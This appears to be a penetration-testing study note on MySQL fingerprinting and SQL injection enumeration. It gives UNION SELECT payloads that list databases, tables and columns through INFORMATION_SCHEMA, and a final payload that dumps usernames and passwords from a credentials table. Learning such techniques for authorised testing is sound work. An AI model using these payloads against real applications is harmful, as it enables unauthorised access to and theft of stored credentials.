# Database Enumeration
***
### MySQL fingerprinting
#### Before enumerating the database, it's important to know which DBMS is the application using. This happens because each DBMS has different queries.
#### Initially we can try to guess by the webserver that we can detect in the HTTP responses, if it is Apache or NGINX, it is probably running on linux, so the DBMS is most likely MySQL. We can also think like that for Microsoft DBMS if the webserver is IIS, it is likely to be MSSQL
#### However, this it's just a guess , as many other databases can be used on either os or web server.

#### Queries to fingerprint MySQL databases
* `SELECT @@version`      / When we have full query output / MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1' / In MSSQL it returns MSSQL version. Error with other DBMS.
* `SELECT POW(1,1)`     /  When we only have numeric output /  1            / Error with other DBMS
* `SELECT SLEEP(5)`    /  Blind/No Output                  /  Delays page response for 5 seconds and returns 0. / Will not delay response with other DBMS

#### INFORMATION_SCHEMA Database
##### We need the following information , in order to properly form our SELECT queries to use in UNION SELECT queries:
* List of databases
* List of tables within each database
* List of columns within each table

##### INFORMATION_SCHEMA is a database of metadata about the databases and tables on the server
##### **NOTE**: To reference a table present in another database, we can use '.' operator
##### Example:
```sql
SELECT * FROM my_db.users;
```

#### SCHEMATA
##### The first step of our enumeration should be, trying to find what databases are available on the DBMS
##### SCHEMATA provides information about databases (schema is a database)
#### Example to get all databases name:
```mysql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
##### **NOTE**: mysql, information_schema, performance_schema, sys, are default databases and are present on any server.

#### Example  with UNION:
```sql
v' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
```
##### To discover which database is being used by the web application we can use the database() function.
#### Example :
```sql
v' UNION select 1,database(),3,4 -- 
```

#### TABLES
##### Then we need to get all tables within a database before extracting data from a given database
##### In order to achieve that we can use the TABLES table in the **INFORMATION_SCHEMA** database.
##### The TABLES table provides information about tables in  databases
##### In that table there are several columns, but the most important for us are **TABLE_SCHEMA** and **TABLE_NAME** columns.
* The TABLE_NAME column sores table names, while the TABLE_SCHE;A column points to the database each t able belongs

#### Example with UNION:
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
```

#### COLUMNS
##### Before dumping the data from a table, we first need to find the column names in the table, which can be found in the **COLUMNS** table.
#### The **COLUMNS** table provides information about columns in tables

#### Example with UNION:
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
```

#### Dumping the data
##### Finally, after those steps we are able to retrieve the data that we want from the database
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```